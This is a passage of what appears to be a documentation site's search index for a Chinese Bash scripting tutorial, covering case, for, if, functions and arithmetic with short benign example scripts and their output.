\u503c1\uff0c\u6267\u884c\u547d\u4ee41\uff1b\u5982\u679c\u4e0d\u6ee1\u8db3\uff0c\u7ee7\u7eed\u5411\u4e0b\u5339\u914d\u503c2\uff0c\u6267\u884c\u547d\u4ee42\uff0c... ... * \u8868\u793a\u7684\u901a\u914d\uff0c\u9664\u4e86\u4e0a\u9762\u6240\u6709\u7684\u503c\u4ee5\u5916\u7684\u503c \u6ce8\u610f\uff1a\u5206\u53f7\u548cesac \u53d8\u91cf\u5e38\u89c1\u7684 $name $1 $2 ... ... \u4f8b\u5b501\uff1a [root@shell script]# case1.sh #!/bin/bash read -p \"Please input a username: \" username case $username in root) echo \"You are super user.\" ;; oracle) echo \"You are oracle account.\" ;; *) echo \"You are nothing.\" ;; esac [root@shell script]# sh case1.sh Please input a username: root You are super user. [root@shell script]# sh case1.sh Please input a username: oracle You are oracle account. [root@shell script]# sh case1.sh Please input a username: douniwan You are nothing. \u4f8b\u5b502\uff1a\u5224\u65ad\u6210\u7ee9 [root@shell script]# case2.sh #!/bin/bash read -p \"Please input your score: \" score case $score in 9[0-9]|100) echo \"excellent\" ;; 8[0-9]) echo \"good\" ;; [67][0-9]) echo \"just so so\" ;; [0-9]|[1-5][0-9]) echo \"you must work hard\" ;; *) echo \"error\" ;; esac [0-9] : \u8868\u793a\u6570\u5b57 | : \u6216\u8005 \u540c\u65f6\u5339\u914d\u4e24\u4e2a\u53d8\u91cf\u7684\u65b9\u6cd5\uff1a 1\u3001\u5c06\u4e24\u4e2a\u53d8\u91cf\u770b\u6210\u4e00\u4e2a\u6574\u4f53 [root@shell script]# case3.sh #!/bin/bash read -p \"Please input your username: \" username read -s -p \"Please input your password: \" password echo case \"$username $password\" in \"root redhat\") echo \"You are right.\" ;; \"oracle ora\") echo \"You are right for oracle.\" ;; *) echo \"You are wrong.\" ;; esac 2\u3001\u7528\u4efb\u610f\u7b26\u53f7\u5206\u9694\u4e24\u4e2a\u53d8\u91cf case $username,$password in root,redhat)","title":"case"},{"location":"programming_language/bash/for/","text":"For 1\u3001\u8bed\u6cd5\u7ed3\u6784 for \u53d8\u91cf in \u53d8\u91cf\u5217\u8868 do \u5faa\u73af\u4f53 //\u53ef\u4ee5\u91cd\u590d\u6267\u884cn\u6b21\u7684 done \u8bf4\u660e\uff1a \u53d8\u91cf\u5217\u8868\u4e2d\u7684\u503c\u7684\u6570\u91cf\uff0c\u51b3\u5b9a\u4e86\u5faa\u73af\u7684\u6b21\u6570 [root@shell script]# cat for1.sh #!/bin/bash for i in 1 2 3 4 5 haha hehe nishuia woshita b do echo $i done \u53d8\u91cf\u5217\u8868\u7684\u5e38\u89c1\u5199\u6cd5\uff1a 1\u3001\u76f4\u89c2 a b c d 1 3 5 ... ... nihao alalei ... ... 2\u3001\u4f7f\u7528\u7cfb\u7edf\u547d\u4ee4 seq \u7b49 [root@shell script]# cat for2.sh #!/bin/bash # seq for i in `seq 10` do echo $i done #\u7cfb\u7edf\u547d\u4ee4 for i in `ls /` do echo $i done ------------------- seq 10 seq 0 10 seq 1 2 10 seq -w 01 09 //\u7b49\u5bbd\u663e\u793a seq -w 10 [root@shell script]# seq 5 -1 1 //\u5012\u5e8f\u6253\u5370 5 4 3 2 1 ------------------- 3\u3001\"$ \u5217\u8868 \u8f93\u51fa \"$*\" a b c d \"a b c d\" \"$@\" a b c d \"a\" \"b\" \"c\" \"d\" [root@shell script]# for3.sh #!/bin/bash for i in \"$*\" do echo $i done echo echo for i in \"$@\" do echo $i done [root@shell script]# chmod +x for3.sh [root@shell script]# ./for3.sh a b c d a b c d a b c d 4\u3001\u4f7f\u7528\u53d8\u91cf [root@shell script]# for4.sh #!/bin/bash WORD=\"q w e r t y u i o p\" for i in $WORD do echo $i done \u5d4c\u5957\u5faa\u73af \u6253\u537099\u4e58\u6cd5\u53e3\u8bc0\u8868 [root@shell script]# 99.sh #!/bin/bash for i in `seq 9` do for j in `seq $i` do echo -n \" $i*$j=$[$i*$j] \" done echo done shell\u4e2dfor\u6a21\u62dfc\u8bed\u8a00\u4e2d\u7684 \u5199\u6cd5 [root@shell 20160902]# cat for.sh #!/bin/bash for ((i=1;i<=5;i++)) do echo $i done","title":"for\u5faa\u73af"},{"location":"programming_language/bash/for/#for","text":"1\u3001\u8bed\u6cd5\u7ed3\u6784 for \u53d8\u91cf in \u53d8\u91cf\u5217\u8868 do \u5faa\u73af\u4f53 //\u53ef\u4ee5\u91cd\u590d\u6267\u884cn\u6b21\u7684 done \u8bf4\u660e\uff1a \u53d8\u91cf\u5217\u8868\u4e2d\u7684\u503c\u7684\u6570\u91cf\uff0c\u51b3\u5b9a\u4e86\u5faa\u73af\u7684\u6b21\u6570 [root@shell script]# cat for1.sh #!/bin/bash for i in 1 2 3 4 5 haha hehe nishuia woshita b do echo $i done \u53d8\u91cf\u5217\u8868\u7684\u5e38\u89c1\u5199\u6cd5\uff1a 1\u3001\u76f4\u89c2 a b c d 1 3 5 ... ... nihao alalei ... ... 2\u3001\u4f7f\u7528\u7cfb\u7edf\u547d\u4ee4 seq \u7b49 [root@shell script]# cat for2.sh #!/bin/bash # seq for i in `seq 10` do echo $i done #\u7cfb\u7edf\u547d\u4ee4 for i in `ls /` do echo $i done ------------------- seq 10 seq 0 10 seq 1 2 10 seq -w 01 09 //\u7b49\u5bbd\u663e\u793a seq -w 10 [root@shell script]# seq 5 -1 1 //\u5012\u5e8f\u6253\u5370 5 4 3 2 1 ------------------- 3\u3001\"$ \u5217\u8868 \u8f93\u51fa \"$*\" a b c d \"a b c d\" \"$@\" a b c d \"a\" \"b\" \"c\" \"d\" [root@shell script]# for3.sh #!/bin/bash for i in \"$*\" do echo $i done echo echo for i in \"$@\" do echo $i done [root@shell script]# chmod +x for3.sh [root@shell script]# ./for3.sh a b c d a b c d a b c d 4\u3001\u4f7f\u7528\u53d8\u91cf [root@shell script]# for4.sh #!/bin/bash WORD=\"q w e r t y u i o p\" for i in $WORD do echo $i done \u5d4c\u5957\u5faa\u73af \u6253\u537099\u4e58\u6cd5\u53e3\u8bc0\u8868 [root@shell script]# 99.sh #!/bin/bash for i in `seq 9` do for j in `seq $i` do echo -n \" $i*$j=$[$i*$j] \" done echo done shell\u4e2dfor\u6a21\u62dfc\u8bed\u8a00\u4e2d\u7684 \u5199\u6cd5 [root@shell 20160902]# cat for.sh #!/bin/bash for ((i=1;i<=5;i++)) do echo $i done","title":"For"},{"location":"programming_language/bash/function/","text":"\u51fd\u6570 \u51fd\u6570\u5c31\u662f\u5b8c\u6210\u67d0\u4e2a\u7279\u5b9a\u529f\u80fd\u7684\u4e00\u6bb5\u811a\u672c \u51fd\u6570\u672c\u8eab\u4e0d\u80fd\u72ec\u7acb\u8fd0\u884c\uff0c\u9700\u8981\u65f6\u901a\u8fc7\u51fd\u6570\u540d\u8c03\u7528\u5b83\u3002 \u8bf4\u660e\uff1a\u4f7f\u7528\u51fd\u6570\uff0c\u4e00\u5b9a\u8981\u5148\u5b9a\u4e49\uff0c\u518d\u53bb\u4f7f\u7528\u3002 \u811a\u672c\u4e2d\u51fd\u6570\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u628a \u547d\u4ee4\u6a21\u5757\u5316 \uff0c\u7f29\u51cf\u547d\u4ee4\u7684\u8f93\u5165\u6b21\u6570 \u4e00\u3001\u51fd\u6570\u7684\u5b9a\u4e49 \u7b2c\u4e00\u79cd\u65b9\u6cd5 function FUNCTION_NAME{ \u51fd\u6570\u4f53 } \u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a \u51fd\u6570\u540d(){ \u51fd\u6570\u4f53 } \u4e8c\u3001\u51fd\u6570\u7684\u8c03\u7528 \u76f4\u63a5\u4f7f\u7528\u51fd\u6570\u540d\u5373\u53ef\u8c03\u7528\u51fd\u6570 showmenu \u4e09\u3001\u81ea\u5b9a\u4e49\u51fd\u6570\u72b6\u6001\u8fd4\u56de\u503c return \u6570\u5b57 // \u6570\u5b57\u8303\u56f4\uff1a0-255 [root@shell script]# cat adduser.sh #!/bin/bash USERADD(){ username=douniwanba if ! id $username &> /dev/null then useradd $username return 0 else return 1 fi } USERADD if [ $? -eq 0 ] //\u6bd4\u8f83\u51fd\u6570\u72b6\u6001\u8fd4\u56de\u503c\u662f\u5426\u4e3a0 then echo \"user $username added successfully.\" else echo \"user $username already exists.\" fi \u56db\u3001\u5e26\u53c2\u6570\u7684\u51fd\u6570 \u8c03\u7528\u5e26\u53c2\u6570\u7684\u51fd\u6570\u7684\u65f6\u5019\uff0c\u9700\u8981\u52a0\u53c2\u6570 \u51fd\u6570\u540d \u53c2\u65701 \u53c2\u65702 ... ... [root@shell script]# cp adduser.sh adduser1.sh [root@shell script]# adduser1.sh [root@shell script]# cat adduser1.sh #!/bin/bash USERADD(){ username=$1 if ! id $username &> /dev/null then useradd $username return 0 else return 1 fi } for i in `seq 10` do USERADD user$i //\u6dfb\u52a0\u7528\u6237user1~user10 if [ $? -eq 0 ] then echo \"user $username added successfully.\" else echo \"user $username already exists.\" fi done for i in `seq 10` do USERADD test$i //\u6dfb\u52a0\u7528\u6237test1~test10 if [ $? -eq 0 ] then echo \"user $username added successfully.\" else echo \"user $username already exists.\" fi done","title":"\u51fd\u6570"},{"location":"programming_language/bash/function/#_1","text":"\u51fd\u6570\u5c31\u662f\u5b8c\u6210\u67d0\u4e2a\u7279\u5b9a\u529f\u80fd\u7684\u4e00\u6bb5\u811a\u672c \u51fd\u6570\u672c\u8eab\u4e0d\u80fd\u72ec\u7acb\u8fd0\u884c\uff0c\u9700\u8981\u65f6\u901a\u8fc7\u51fd\u6570\u540d\u8c03\u7528\u5b83\u3002 \u8bf4\u660e\uff1a\u4f7f\u7528\u51fd\u6570\uff0c\u4e00\u5b9a\u8981\u5148\u5b9a\u4e49\uff0c\u518d\u53bb\u4f7f\u7528\u3002 \u811a\u672c\u4e2d\u51fd\u6570\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u628a \u547d\u4ee4\u6a21\u5757\u5316 \uff0c\u7f29\u51cf\u547d\u4ee4\u7684\u8f93\u5165\u6b21\u6570","title":"\u51fd\u6570"},{"location":"programming_language/bash/function/#_2","text":"\u7b2c\u4e00\u79cd\u65b9\u6cd5 function FUNCTION_NAME{ \u51fd\u6570\u4f53 } \u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a \u51fd\u6570\u540d(){ \u51fd\u6570\u4f53 }","title":"\u4e00\u3001\u51fd\u6570\u7684\u5b9a\u4e49"},{"location":"programming_language/bash/function/#_3","text":"\u76f4\u63a5\u4f7f\u7528\u51fd\u6570\u540d\u5373\u53ef\u8c03\u7528\u51fd\u6570 showmenu","title":"\u4e8c\u3001\u51fd\u6570\u7684\u8c03\u7528"},{"location":"programming_language/bash/function/#_4","text":"return \u6570\u5b57 // \u6570\u5b57\u8303\u56f4\uff1a0-255 [root@shell script]# cat adduser.sh #!/bin/bash USERADD(){ username=douniwanba if ! id $username &> /dev/null then useradd $username return 0 else return 1 fi } USERADD if [ $? -eq 0 ] //\u6bd4\u8f83\u51fd\u6570\u72b6\u6001\u8fd4\u56de\u503c\u662f\u5426\u4e3a0 then echo \"user $username added successfully.\" else echo \"user $username already exists.\" fi","title":"\u4e09\u3001\u81ea\u5b9a\u4e49\u51fd\u6570\u72b6\u6001\u8fd4\u56de\u503c"},{"location":"programming_language/bash/function/#_5","text":"\u8c03\u7528\u5e26\u53c2\u6570\u7684\u51fd\u6570\u7684\u65f6\u5019\uff0c\u9700\u8981\u52a0\u53c2\u6570 \u51fd\u6570\u540d \u53c2\u65701 \u53c2\u65702 ... ... [root@shell script]# cp adduser.sh adduser1.sh [root@shell script]# adduser1.sh [root@shell script]# cat adduser1.sh #!/bin/bash USERADD(){ username=$1 if ! id $username &> /dev/null then useradd $username return 0 else return 1 fi } for i in `seq 10` do USERADD user$i //\u6dfb\u52a0\u7528\u6237user1~user10 if [ $? -eq 0 ] then echo \"user $username added successfully.\" else echo \"user $username already exists.\" fi done for i in `seq 10` do USERADD test$i //\u6dfb\u52a0\u7528\u6237test1~test10 if [ $? -eq 0 ] then echo \"user $username added successfully.\" else echo \"user $username already exists.\" fi done","title":"\u56db\u3001\u5e26\u53c2\u6570\u7684\u51fd\u6570"},{"location":"programming_language/bash/if/","text":"if if\u5224\u65ad\u7684\u8bed\u6cd5\u7ed3\u6784 if\u548cfi\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u811a\u672c\u91cc\u6709\u51e0\u4e2aif\u5c31\u8981\u6709\u51e0\u4e2afi 1\uff09\u6700\u7b80\u5355\u7684\u8bed\u6cd5 if \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 then \u547d\u4ee4; fi \u4f8b\u5b50\uff1a [root@shell script]# if1.sh #!/bin/bash if [ -e /etc/passwd ] then echo \"file exists\" fi [root@shell script]# sh if1.sh file exists [root@shell script]# cat if2.sh #!/bin/bash ping -c3 172.16.254.254 &>/dev/null if [ $? -eq 0 ] //if\u540e\u9762\u8ddf\u8868\u8fbe\u5f0f then echo \"172.16.254.254 is alive.\" fi if ping -c3 172.16.4.254 &>/dev/null //if\u540e\u9762\u76f4\u63a5\u8ddf\u547d\u4ee4 then echo \"172.16.4.254 is alive.\" fi [root@shell script]# sh if2.sh 172.16.254.254 is alive. 172.16.4.254 is alive. if ! ping -c3 172.16.4.254 &>/dev/null //\u547d\u4ee4\u524d\u9762\u662f\u53ef\u4ee5\u52a0!\uff0c\u53d6\u975e\u7684\u610f\u601d 2\uff09\u5206\u652f\u7684if\u7ed3\u6784\u8bed\u6cd5 if \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 then \u547d\u4ee4; else \u547d\u4ee4; fi \u200b \u4f8b\u5b50\uff1a [root@shell script]# if3.sh #!/bin/bash read -p \"Please input a filename: \" filename if [ -e $filename ] then echo \"file $filename exists.\" else echo \"file $filename not exists.\" fi [root@shell script]# sh if3.sh Please input a filename: /etc/passwd file /etc/passwd exists. [root@shell script]# sh if3.sh Please input a filename: /etc/douniwan file /etc/douniwan not exists. 3\uff09\u591a\u5206\u652fif\u7ed3\u6784\u8bed\u6cd5 if \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 then \u547d\u4ee4\uff1b elif \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 //elif\u53ef\u4ee5\u6709\u591a\u4e2a then \u547d\u4ee4\uff1b else \u547d\u4ee4\uff1b fi \u4f8b\u5b50\uff1a \u8981\u6c42\u7528\u6237\u8f93\u5165\u7684\u5206\u6570\u4e3a\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u9000\u51fa\u811a\u672c \u8981\u6c42\u5982\u679c\u8f93\u5165\u7684\u5206\u6570\u5927\u4e8e100\u6216\u8005\u5c0f\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\u811a\u672c \u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5206\u6570\u6765\u5224\u65ad\uff0c\u4f18\u79c0(>=90)\u3001\u826f\u597d\uff08>=80\uff09\u3001\u4e00\u822c\uff08>=60\uff09\u7b49 [root@shell script]# if4.sh #!/bin/bash read -p \"\u8bf7\u8f93\u5165\u5206\u6570\uff1a\" score if [ -z $score ] then echo \"\u5206\u6570\u4e0d\u80fd\u4e3a\u7a7a\" exit fi if [ $score -gt 100 -o $score -lt 0 ] if [[ $score -gt 100 || $score -lt 0 ]] then echo \"\u975e\u6cd5\u7684\u5206\u6570\u503c\" exit fi if [ $score -ge 90 ] then echo \"\u4f18\u79c0\" elif [ $score -ge 80 ] then echo \"\u826f\u597d\" elif [ $score -ge 60 ] then echo \"\u4e00\u822c\" else echo \"\u4e0d\u53ca\u683c\" fi [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a-2 \u975e\u6cd5\u7684\u5206\u6570\u503c [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a20 \u4e0d\u53ca\u683c [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a77 \u4e00\u822c [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a88 \u826f\u597d [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a99 \u4f18\u79c0 4\uff09 \u591a\u91cd\u6761\u4ef6\u5224\u65ad \u6761\u4ef6\u8868\u8fbe\u5f0f1 \u9009\u9879 \u6761\u4ef6\u8868\u8fbe\u5f0f2 \u9009\u9879\uff1a -a\uff1a\u5e76\u4e14 && -o\uff1a\u6216\u8005 || \uff01\u6761\u4ef6\u8868\u8fbe\u5f0f \uff1a\u53d6\u53cd\uff0c\u975e if [ $score -gt 100 -o $score -lt 0 ] if [ $score -gt 100 ] || [ $score -lt 0 ] if [[ $score -gt 100 || $score -lt 0 ]]","title":"if\u8bed\u53e5"},{"location":"programming_language/bash/if/#if","text":"if\u5224\u65ad\u7684\u8bed\u6cd5\u7ed3\u6784 if\u548cfi\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u811a\u672c\u91cc\u6709\u51e0\u4e2aif\u5c31\u8981\u6709\u51e0\u4e2afi 1\uff09\u6700\u7b80\u5355\u7684\u8bed\u6cd5 if \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 then \u547d\u4ee4; fi \u4f8b\u5b50\uff1a [root@shell script]# if1.sh #!/bin/bash if [ -e /etc/passwd ] then echo \"file exists\" fi [root@shell script]# sh if1.sh file exists [root@shell script]# cat if2.sh #!/bin/bash ping -c3 172.16.254.254 &>/dev/null if [ $? -eq 0 ] //if\u540e\u9762\u8ddf\u8868\u8fbe\u5f0f then echo \"172.16.254.254 is alive.\" fi if ping -c3 172.16.4.254 &>/dev/null //if\u540e\u9762\u76f4\u63a5\u8ddf\u547d\u4ee4 then echo \"172.16.4.254 is alive.\" fi [root@shell script]# sh if2.sh 172.16.254.254 is alive. 172.16.4.254 is alive. if ! ping -c3 172.16.4.254 &>/dev/null //\u547d\u4ee4\u524d\u9762\u662f\u53ef\u4ee5\u52a0!\uff0c\u53d6\u975e\u7684\u610f\u601d 2\uff09\u5206\u652f\u7684if\u7ed3\u6784\u8bed\u6cd5 if \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 then \u547d\u4ee4; else \u547d\u4ee4; fi \u200b \u4f8b\u5b50\uff1a [root@shell script]# if3.sh #!/bin/bash read -p \"Please input a filename: \" filename if [ -e $filename ] then echo \"file $filename exists.\" else echo \"file $filename not exists.\" fi [root@shell script]# sh if3.sh Please input a filename: /etc/passwd file /etc/passwd exists. [root@shell script]# sh if3.sh Please input a filename: /etc/douniwan file /etc/douniwan not exists. 3\uff09\u591a\u5206\u652fif\u7ed3\u6784\u8bed\u6cd5 if \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 then \u547d\u4ee4\uff1b elif \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 //elif\u53ef\u4ee5\u6709\u591a\u4e2a then \u547d\u4ee4\uff1b else \u547d\u4ee4\uff1b fi \u4f8b\u5b50\uff1a \u8981\u6c42\u7528\u6237\u8f93\u5165\u7684\u5206\u6570\u4e3a\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u9000\u51fa\u811a\u672c \u8981\u6c42\u5982\u679c\u8f93\u5165\u7684\u5206\u6570\u5927\u4e8e100\u6216\u8005\u5c0f\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\u811a\u672c \u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5206\u6570\u6765\u5224\u65ad\uff0c\u4f18\u79c0(>=90)\u3001\u826f\u597d\uff08>=80\uff09\u3001\u4e00\u822c\uff08>=60\uff09\u7b49 [root@shell script]# if4.sh #!/bin/bash read -p \"\u8bf7\u8f93\u5165\u5206\u6570\uff1a\" score if [ -z $score ] then echo \"\u5206\u6570\u4e0d\u80fd\u4e3a\u7a7a\" exit fi if [ $score -gt 100 -o $score -lt 0 ] if [[ $score -gt 100 || $score -lt 0 ]] then echo \"\u975e\u6cd5\u7684\u5206\u6570\u503c\" exit fi if [ $score -ge 90 ] then echo \"\u4f18\u79c0\" elif [ $score -ge 80 ] then echo \"\u826f\u597d\" elif [ $score -ge 60 ] then echo \"\u4e00\u822c\" else echo \"\u4e0d\u53ca\u683c\" fi [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a-2 \u975e\u6cd5\u7684\u5206\u6570\u503c [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a20 \u4e0d\u53ca\u683c [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a77 \u4e00\u822c [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a88 \u826f\u597d [root@shell script]# sh if4.sh \u8bf7\u8f93\u5165\u5206\u6570\uff1a99 \u4f18\u79c0 4\uff09 \u591a\u91cd\u6761\u4ef6\u5224\u65ad \u6761\u4ef6\u8868\u8fbe\u5f0f1 \u9009\u9879 \u6761\u4ef6\u8868\u8fbe\u5f0f2 \u9009\u9879\uff1a -a\uff1a\u5e76\u4e14 && -o\uff1a\u6216\u8005 || \uff01\u6761\u4ef6\u8868\u8fbe\u5f0f \uff1a\u53d6\u53cd\uff0c\u975e if [ $score -gt 100 -o $score -lt 0 ] if [ $score -gt 100 ] || [ $score -lt 0 ] if [[ $score -gt 100 || $score -lt 0 ]]","title":"if"},{"location":"programming_language/bash/math/","text":"Shell \u4e2d\u7684\u8fd0\u7b97 + - * / % (\u53d6\u4f59) **(\u5e42\u8fd0\u7b97) \u8fd0\u7b97\u7b26 \u4f18\u5148\u7ea7 \u8fd0\u7b97\u7b26 \u8fd0\u7b97\u7b26 13 -\uff0c+ \u5355\u76ee\u8d1f\u3001 \u5355\u76ee\u6b63 12 !\uff0c~ \u903b\u8f91\u975e\u3001 \u6309\u4f4d\u53d6\u53cd\u6216\u8865\u7801 11 *\uff0c/\uff0c% \u4e58\u3001 \u9664\u3001 \u53d6\u6a21 10 +\uff0c- \u52a0\u3001 \u51cf 9 <<\uff0c>> \u6309\u4f4d\u5de6\u79fb\u3001 \u6309\u4f4d\u53f3\u79fb 8 <=\uff0c>=\uff0c<\uff0c> \u5c0f\u4e8e\u6216\u7b49\u4e8e\u3001 \u5927\u4e8e\u6216\u7b49\u4e8e\u3001 \u5c0f\u4e8e\u3001 \u5927\u4e8e 7 ==\uff0c!= \u7b49\u4e8e\u3001 \u4e0d\u7b49\u4e8e 6 & \u6309\u4f4d\u4e0e 5 ^ \u6309\u4f4d\u5f02\u6216 4 | \u6309\u4f4d\u6216 3 && \u903b\u8f91\u4e0e 2 || \u903b\u8f91\u6216 1 =\uff0c+=\uff0c-=\uff0c*=\uff0c/=\uff0c%=\uff0c&=\uff0c^=\uff0c=\uff0c<<=\uff0c>>= \u8d4b\u503c\u3001 \u8fd0\u7b97\u4e14\u8d4b\u503c 1\u3001 $((\u8fd0\u7b97\u5f0f)) \u6216 $[\u8fd0\u7b97\u5f0f] $[]\u548c$(()) [root@shell ~]# echo $[1+2] 3 [root@shell ~]# echo $((1+2)) 3 [root@shell ~]# echo $[2**16] 65536 2\u3001expr \u6570\u503c\u8fd0\u7b97\u5de5\u5177 [root@localhost ~]# aa=11 [root@localhost ~]# bb=22 #\u7ed9\u53d8\u91cfaa\u548c\u53d8\u91cfbb\u8d4b\u503c [root@localhost ~]# dd=$(expr $aa + $bb) #dd\u7684\u503c\u662faa\u548cbb\u7684\u548c\u3002\u6ce8\u610f\u201c+\u201d\u53f7\u5de6\u53f3\u4e24\u4fa7\u5fc5\u987b\u6709\u7a7a\u683c 3\u3001let \u5e38\u7528\u4e8ewhile\u5faa\u73af\u53d8\u91cf\u66f4\u65b0 let \u53d8\u91cf=\u503c\uff0c\u8fd0\u7b97\u516c\u5f0f\u91cc\u9762\u4e0d\u80fd\u6709\u7a7a\u683c [root@shell ~]# let sum=1+2 [root@shell ~]# echo $sum 3 [root@shell ~]# a=8 [root@shell ~]# b=5 [root@shell ~]# let ji=$a*$b [root@shell ~]# echo $ji 40 [root@shell ~]# let i++ //\u5728\u5faa\u73af\u4e2d\u66f4\u65b0\u53d8\u91cf\u503c\u5e38\u7528\u7684\uff0c\u6bcf\u6b21i\u7684\u503c\u52a01 4\u3001Linux\u8ba1\u7b97\u5668 [root@shell ~]# bc bc 1.06.95 Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc. This is free software with ABSOLUTELY NO WARRANTY. For details type `warranty'. 5/6 0 6/5 1 9/8 1 scale=3 //\u6307\u5b9a\u7cbe\u5ea6\uff0c\u7cbe\u5ea6\u5c31\u662f\u5c0f\u6570\u70b9\u540e\u4fdd\u7559\u51e0\u4f4d\u5c0f\u6570 9/8 1.125 1/3 0.333 ctrl + d \u9000\u51fa 4\u3001 declare\u547d\u4ee4 \u9009\u9879\uff1a -\uff1a \u7ed9\u53d8\u91cf\u8bbe\u5b9a\u7c7b\u578b\u5c5e\u6027 +\uff1a\u53d6\u6d88\u53d8\u91cf\u7684\u7c7b\u578b\u5c5e\u6027 -i\uff1a\u5c06\u53d8\u91cf\u58f0\u660e\u4e3a\u6574\u6570\u578b\uff08integer\uff09 -x\uff1a\u5c06\u53d8\u91cf\u58f0\u660e\u4e3a\u73af\u5883\u53d8\u91cf -p\uff1a\u663e\u793a\u6307\u5b9a\u53d8\u91cf\u7684\u88ab\u58f0\u660e\u7684\u7c7b\u578ba : \u5c06\u53d8\u91cf\u58f0\u660e\u4e3a\u6570\u7ec4\u578b r\uff1a\u5c06\u53d8\u91cf\u58f0\u660e\u4e3a\u53ea\u8bfb\u53d8\u91cf p\uff1a\u663e\u793a\u6307\u5b9a\u53d8\u91cf\u7684\u88ab\u58f0\u660e\u7684\u7c7b\u578b [root@localhost ~]# aa=11 [root@localhost ~]# bb=22 #\u7ed9\u53d8\u91cfaa\u548cbb\u8d4b\u503c [root@localhost ~]# declare -i cc=$aa+$bb 1\u3001\u53d8\u91cf\u58f0\u660e\u4e3a\u6570\u503c\u578b declare -i num=12 \u4e5f\u53ef\u4ee5\u67e5\u770b\u53d8\u91cf\u7c7b\u578b declare -p num \u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b declare -i num=\"12\" 2\u3001\u58f0\u660e\u6570\u7ec4\u53d8\u91cf \uff081\uff09\u5b9a\u4e49\u6570\u7ec4 arr[0]=x arr[1]=y declare -a arr[2]=z \uff082\uff09\u67e5\u770b\u6570\u7ec4 echo ${arr} ---\u7ed3\u679cx echo ${arr[2]} ---\u7ed3\u679cz echo ${arr[8]} ---\u7ed3\u679cx y z \u548c\u666e\u901a\u53d8\u91cf\u533a\u522b\u662f\u4f7f\u7528\u5927\u62ec\u53f7\uff0c\u540c\u65f6\u4f7f\u7528\u4e0b\u6807\uff0c\u82e5\u6ca1\u6709\u4e0b\u6807\uff0c\u5219\u9ed8\u8ba4\u4f7f\u75280\u3002 3\u3001\u58f0\u660e\u73af\u5883\u53d8\u91cf declare -x t=123 export\u547d\u4ee4\u8c03\u7528\u7684\u4e5f\u662f\u4e0a\u9762declare -x \u7684\u547d\u4ee4 4\u3001\u58f0\u660e\u53d8\u91cf\u53ea\u8bfb\u5c5e\u6027 declare -r a=123 \u91cd\u65b0\u8d4b\u503c\u4f1a\u62a5\u9519\uff0c\u4e0d\u80fd\u4fee\u6539\uff0c\u4e0d\u80fd\u5220\u9664 5\u3001\u67e5\u770b\u53d8\u91cf\u5c5e\u6027 declare -p \u67e5\u770b\u6240\u6709\u53d8\u91cf\u5c5e\u6027 declare -p \u53d8\u91cf\u540d \u67e5\u770b\u6307\u5b9a\u53d8\u91cf\u7684\u5c5e\u6027","title":"\u6570\u5b66\u8fd0\u7b97"},{"location":"programming_language/bash/math/#shell","text":"+ - * / % (\u53d6\u4f59) **(\u5e42\u8fd0\u7b97) \u8fd0\u7b97\u7b26 \u4f18\u5148\u7ea7 \u8fd0\u7b97\u7b26 \u8fd0\u7b97\u7b26 13 -\uff0c+ \u5355\u76ee\u8d1f\u3001 \u5355\u76ee\u6b63 12 !\uff0c~ \u903b\u8f91\u975e\u3001 \u6309\u4f4d\u53d6\u53cd\u6216\u8865\u7801 11 *\uff0c/\uff0c% \u4e58\u3001 \u9664\u3001 \u53d6\u6a21 10 +\uff0c- \u52a0\u3001 \u51cf 9 <<\uff0c>> \u6309\u4f4d\u5de6\u79fb\u3001 \u6309\u4f4d\u53f3\u79fb 8 <=\uff0c>=\uff0c<\uff0c> \u5c0f\u4e8e\u6216\u7b49\u4e8e\u3001 \u5927\u4e8e\u6216\u7b49\u4e8e\u3001 \u5c0f\u4e8e\u3001 \u5927\u4e8e 7 ==\uff0c!= \u7b49\u4e8e\u3001 \u4e0d\u7b49\u4e8e 6 & \u6309\u4f4d\u4e0e 5 ^ \u6309\u4f4d\u5f02\u6216 4 | \u6309\u4f4d\u6216 3 && \u903b\u8f91\u4e0e 2 || \u903b\u8f91\u6216 1 =\uff0c+=\uff0c-=\uff0c*=\uff0c/=\uff0c%=\uff0c&=\uff0c^=\uff0c=\uff0c<<=\uff0c>>= \u8d4b\u503c\u3001 \u8fd0\u7b97\u4e14\u8d4b\u503c","title":"Shell \u4e2d\u7684\u8fd0\u7b97"},{"location":"programming_language/bash/math/#1","text":"$[]\u548c$(()) [root@shell ~]# echo $[1+2] 3 [root@shell ~]# echo $((1+2)) 3 [root@shell ~]# echo $[2**16] 65536","title":"1\u3001 $((\u8fd0\u7b97\u5f0f))   \u6216  